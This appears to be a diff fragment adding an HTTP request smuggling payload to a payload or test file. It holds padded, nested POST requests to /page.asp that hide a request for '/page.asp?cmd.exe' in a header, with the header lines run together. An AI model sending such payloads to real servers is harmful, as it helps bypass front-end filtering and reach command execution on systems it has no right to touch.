@@ -1,0 +1,3 @@
+-POST /page.asp HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Length: 49223
+-                     zzz...zzz ["z" x 49152]POST /page.asp HTTP/1.0Connection: Keep-AliveContent-Length: 30
+-                     POST /page.asp HTTP/1.0Bla: POST /page.asp?cmd.exe HTTP/1.0Connection: Keep-Alive
